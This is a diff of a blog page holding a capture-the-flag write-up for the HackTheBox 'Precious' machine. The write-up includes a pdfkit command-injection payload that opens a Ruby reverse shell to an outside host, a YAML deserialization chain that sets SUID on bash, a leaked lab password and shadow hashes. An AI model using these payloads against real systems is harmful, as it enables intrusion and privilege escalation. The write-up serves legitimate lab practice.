@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;513  10.10.11.189                                                                                                              端口扫描22和80: 12345678">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;513  10.10.11.189   端口扫描22和80: 1234567891011121314151617181920$ nmap -sC -sV -Pn 10.10.11.189Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-12-03">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Precious - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/12/03/Precious-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;513  10.10.11.189                                                                                                              端口扫描22和80: 12345678">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;513  10.10.11.189   端口扫描22和80: 1234567891011121314151617181920$ nmap -sC -sV -Pn 10.10.11.189Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-12-03">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022120301.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022120302.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022120303.jpg">
@@ -120,8 +120,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -143,7 +150,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -211,14 +218,7 @@
 </li>
 <li><h2 id="10-10-11-189"><a href="#10-10-11-189" class="headerlink" title="10.10.11.189"></a>10.10.11.189</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120301.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120301.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.189</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-03 15:24 CST</span><br><span class="line">Nmap scan report for 10.10.11.189</span><br><span class="line">Host is up (0.31s latency).</span><br><span class="line">Not shown: 996 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE    SERVICE   VERSION</span><br><span class="line">22/tcp   open     ssh       OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 845e13a8e31e20661d235550f63047d2 (RSA)</span><br><span class="line">|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)</span><br><span class="line">|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)</span><br><span class="line">80/tcp   open     http      nginx 1.18.0</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">|_http-title: Did not follow redirect to http://precious.htb/</span><br><span class="line">2161/tcp filtered apc-agent</span><br><span class="line">8045/tcp filtered unknown</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 95.64 seconds</span><br></pre></td></tr></table></figure>
 
@@ -228,23 +228,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.189 precious.htb</span><br></pre></td></tr></table></figure>
 
 <p>输入URL转换成PDF：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120302.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120302.jpg" alt=""></p>
 <h1 id="pdfkit"><a href="#pdfkit" class="headerlink" title="pdfkit"></a>pdfkit</h1><p>测试pdf转换，发现使用pdfkit v0.8.6：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120303.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120303.jpg" alt=""></p>
 <p>搜到相关漏洞：</p>
 <ul>
 <li>Command Injection in pdfkit | CVE-2022-25765 | Snyk<br><a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795" target="_blank" rel="noopener">https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795</a></li>
@@ -252,74 +238,23 @@
 <h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>打到ruby shell：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.14.10:7777&#x2F;?name&#x3D;#&#123;&#39;%20&#96;ruby -rsocket -e&#39;spawn(&quot;sh&quot;,[:in,:out,:err]&#x3D;&gt;TCPSocket.new(&quot;10.10.14.10&quot;,4444))&#39;&#96;&#39;&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120304.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120304.jpg" alt=""></p>
 <h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>bundle config中得到henry用户密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">henry:Q3c1AqGHtoI0aXAYFH</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120305.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120305.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>henry用户ssh登录，得到user flag：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120306.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120306.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>sudo -l  发现一个ruby脚本，调用yaml，找到原本的yaml文件确认yaml库版本：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120307.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120308.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120307.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120308.jpg" alt=""></p>
 <h2 id="yaml"><a href="#yaml" class="headerlink" title="yaml"></a>yaml</h2><p>yaml反序列化：</p>
 <ul>
 <li>Blind Remote Code Execution through YAML Deserialization<br><a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/" target="_blank" rel="noopener">https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/</a></li>
 </ul>
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>构造一个恶意yml文件，调用ruby脚本触发命令执行：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120309.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120310.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120309.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022120310.jpg" alt=""></p>
 <h2 id="dependencies-yml"><a href="#dependencies-yml" class="headerlink" title="dependencies.yml"></a>dependencies.yml</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby</span><span class="string">/object:Gem::Installer</span></span><br><span class="line"><span class="attr">    i:</span> <span class="string">x</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby</span><span class="string">/object:Gem::SpecFetcher</span></span><br><span class="line"><span class="attr">    i:</span> <span class="string">y</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby</span><span class="string">/object:Gem::Requirement</span></span><br><span class="line"><span class="attr">  requirements:</span></span><br><span class="line">    <span class="type">!ruby</span><span class="string">/object:Gem::Package::TarReader</span></span><br><span class="line"><span class="attr">    io:</span> <span class="string">&amp;1</span> <span class="type">!ruby</span><span class="string">/object:Net::BufferedIO</span></span><br><span class="line"><span class="attr">      io:</span> <span class="string">&amp;1</span> <span class="type">!ruby</span><span class="string">/object:Gem::Package::TarReader::Entry</span></span><br><span class="line"><span class="attr">         read:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">         header:</span> <span class="string">"abc"</span></span><br><span class="line"><span class="attr">      debug_output:</span> <span class="string">&amp;1</span> <span class="type">!ruby</span><span class="string">/object:Net::WriteAdapter</span></span><br><span class="line"><span class="attr">         socket:</span> <span class="string">&amp;1</span> <span class="type">!ruby</span><span class="string">/object:Gem::RequestSet</span></span><br><span class="line"><span class="attr">             sets:</span> <span class="type">!ruby</span><span class="string">/object:Net::WriteAdapter</span></span><br><span class="line"><span class="attr">                 socket:</span> <span class="type">!ruby</span><span class="string">/module</span> <span class="string">'Kernel'</span></span><br><span class="line"><span class="attr">                 method_id:</span> <span class="string">:system</span></span><br><span class="line"><span class="attr">             git_set:</span> <span class="string">chmod</span> <span class="string">+s</span> <span class="string">/usr/bin/bash</span></span><br><span class="line"><span class="attr">         method_id:</span> <span class="string">:resolve</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$a.ggVdbxv0sDezKDImKn91$BB2mMoZ0UwInxNcXuyDALhr4li59AHfVw5DuV0d5Ww1:19284:0:99999:7:::</span><br><span class="line">henry:$y$j9T$Q&#x2F;v28PgszKjK0KDbSATMs1$7K1zLKHnnClQLLI92aeVT9HQXA6bgaG4BOTgLTGi.gA:19261:0:99999:7:::</span><br></pre></td></tr></table></figure>
@@ -340,7 +275,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2023-05-22T01:38:13.960Z" itemprop="dateUpdated">2023-05-22 09:38:13</time>
+    Last updated: <time datetime="2023-05-22T01:38:13.960Z" itemprop="dateUpdated">2023-05-22 09:38:13</time>
 </span><br>
 
 
@@ -507,11 +442,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
